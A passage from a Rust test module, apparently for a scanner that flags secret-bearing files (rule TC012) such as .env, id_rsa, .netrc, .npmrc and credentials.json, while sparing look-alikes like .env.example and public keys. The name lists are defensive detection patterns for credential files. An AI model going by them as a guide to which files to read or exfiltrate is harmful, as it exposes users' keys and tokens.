        assert!(c.texts.iter().any(|t| t.rel == ".env" && t.secret));
        assert!(c.incomplete.is_empty());
    }

    #[test]
    fn secret_bearing_names() {
        for s in [
            ".env",
            ".env.local",
            "server.pem",
            "tls.key",
            "id_rsa",
            "id_ed25519",
            "id_ecdsa",
            "credentials",
            "credentials.json",
            "api_token.txt",
            "tokens.json",
            "cert.p12",
            "cert.pfx",
            ".npmrc",
            ".pypirc",
            ".netrc",
            "auth.json",
            "my-secret.txt",
            "API_TOKEN",
        ] {
            assert!(is_secret_bearing(s), "{s}");
        }
        for s in [
            "SKILL.md",
            "run.sh",
            "environment.md",
            "keys.md",
            "id_ed25519.pub",
            "id_rsa.pub",
            ".env.example",
            ".env.sample",
            ".env.template",
            ".env.dist",
            ".env.defaults",
            "scripts/issue_short_token.sh",
            "issue_short_token.sh",
            "refresh_token.sh",
            "exchange_token.sh",
            "tokens.css",
            "secret.py",
            "token.example.json",
            "secret.sample",
        ] {
            assert!(!is_secret_bearing(s), "{s}");
        }
    }

    #[test]
    fn false_positive_names_get_no_tc012_and_real_ones_do() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("SKILL.md"), "ok\n").unwrap();
        for n in [
            "issue_short_token.sh",
            "refresh_token.sh",
            "exchange_token.sh",
            ".env.example",
            "tokens.css",
            "id_ed25519.pub",
        ] {
            std::fs::write(dir.path().join(n), "x=1\n").unwrap();
        }
        for n in [
            ".env",
            ".env.local",
            "id_ed25519",
            "api_token.txt",
            "tokens.json",
        ] {
            std::fs::write(dir.path().join(n), "x=1\n").unwrap();
        }
        let c = ctx_read(dir.path(), 1024);
        let flagged = |n: &str| {
            c.texts.iter().any(|t| t.rel == n && t.secret)
                && c.findings.iter().any(|f| {
                    f.rule == "TC012"
                        && f.file
                            .as_ref()
                            .is_some_and(|p| p.file_name().is_some_and(|x| x == n))
                })
        };
        for n in [
            ".env",
            ".env.local",
            "id_ed25519",
            "api_token.txt",
            "tokens.json",
        ] {
            assert!(flagged(n), "{n}");
        }
        assert_eq!(
            c.findings.iter().filter(|f| f.rule == "TC012").count(),
            5,
            "{:?}",
            c.findings
        );
    }

    // L11: raw bytes are the identity; display is reversible.
    #[cfg(target_os = "linux")]
    #[test]
    fn invalid_utf8_names_stay_distinct() {
        use std::os::unix::ffi::OsStrExt;
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(OsStr::from_bytes(b"a\xffb.md")), "1").unwrap();
        std::fs::write(dir.path().join(OsStr::from_bytes(b"a\xfeb.md")), "1").unwrap();
        std::fs::write(dir.path().join("a%FFb.md"), "1").unwrap();
        let c = ctx_read(dir.path(), 1024);
        let mut rels: Vec<&str> = c.files.iter().map(|f| f.rel.as_str()).collect();
        rels.sort();
        assert_eq!(rels, ["a%25FFb.md", "a%FEb.md", "a%FFb.md"]);
    }
}
